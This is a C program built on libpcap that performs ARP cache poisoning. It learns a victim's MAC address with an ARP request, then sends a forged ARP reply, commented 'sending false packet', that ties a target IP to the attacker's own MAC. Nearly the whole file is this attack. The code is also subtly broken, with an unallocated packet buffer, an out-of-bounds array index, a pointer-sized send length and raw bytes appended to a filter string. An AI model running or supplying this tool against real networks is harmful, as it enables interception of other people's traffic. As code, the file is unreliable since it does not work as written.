#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <sys/fcntl.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <stdio.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>

unsigned char broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
unsigned char blank[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
unsigned char arp_request[2] = {0x00, 0x01};
unsigned char arp_reply[2] = {0x00, 0x02};

typedef unsigned char BYTE;

void checkHostName(int hostname) 
{ 
    if (hostname == -1) 
    { 
        perror("gethostname"); 
        exit(1); 
    } 
} 

void checkHostEntry(struct hostent * hostentry) 
{ 
    if (hostentry == NULL) 
    { 
        perror("gethostbyname"); 
        exit(1); 
    } 
} 

void checkIPbuffer(char *IPbuffer) 
{ 
    if (NULL == IPbuffer) 
    { 
        perror("inet_ntoa"); 
        exit(1); 
    } 
} 

void Packet_Gen(unsigned char *eth_dmac, unsigned char * eth_smac, unsigned char *opcode, unsigned char *sender_mac, unsigned char *sender_ip, unsigned char *target_mac, unsigned char *target_ip, u_char *packet) {
  memcpy(packet, eth_dmac, 6);
  memcpy(packet+6, eth_smac, 6);
  u_char tmp[8]={0x08,0x06,0x00,0x01,0x08,0x00,0x06,0x04};
  for(int i=12;i<20;i++) packet[i]=tmp[i];
  memcpy(packet+20, opcode, 2);
  memcpy(packet+22, sender_mac, 6);
  memcpy(packet+28, sender_ip, 4);
  memcpy(packet+32, target_mac, 6);
  memcpy(packet+38, target_ip, 4);
  
}

int main(int argc, char * argv[]) {
  struct ifreq ifr;
  struct ether_arp packet;
  struct ether_header header;
  struct hostent *host_entry;
  struct bpf_program fp;
  struct pcap_pkthdr *head;
  const BYTE *data;
  u_char* frametype=(unsigned char*)"8060";
  u_char* sending_packet;
  char hostbuffer[256];
  char* IPbuffer;
  char filter[100]="ether proto 0x0806 and ether dst ";
  bpf_u_int32 net;
  u_int8_t senderip[4], targetip[4], attackerip[4];
  int s, i, packlen, hostname;

  if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
    perror("socket");
    return -1;
  }

  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  
  strcpy(ifr.ifr_name, argv[1]);
  if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
    perror("ioctl");
    return -1;
  }
  
  packlen = sizeof(ether_header) + sizeof(ether_arp);
  unsigned char *hwaddr = (unsigned char *)ifr.ifr_hwaddr.sa_data;
  unsigned char *attacker_MAC;
  inet_pton(AF_INET, argv[2], senderip);
  inet_pton(AF_INET, argv[3], targetip);
  header.ether_type=ETHERTYPE_ARP;
  hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
  checkHostName(hostname); 
  host_entry = gethostbyname(hostbuffer); 
  checkHostEntry(host_entry); 
  IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
  inet_pton(AF_INET, IPbuffer, attackerip);
  strcat(filter, (char*)hwaddr);
  pcap_compile(handle, &fp, filter, 0, net);
  pcap_setfilter(handle, &fp);

  Packet_Gen(broadcast, hwaddr, arp_request, hwaddr, attackerip, blank, senderip, sending_packet);
  //printf("%s", sending_packet);
//sending packet generation
//packet sending&getting reply
  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
  int res = pcap_next_ex(handle, &head, &data);
  unsigned char* sender_mac = (unsigned char*)data+22;
  Packet_Gen(sender_mac, hwaddr, arp_reply, hwaddr, targetip, sender_mac, senderip, sending_packet);

//sending false packet
  pcap_sendpacket(handle, sending_packet, sizeof(sending_packet));
  close(s);
  
  return 0;
}
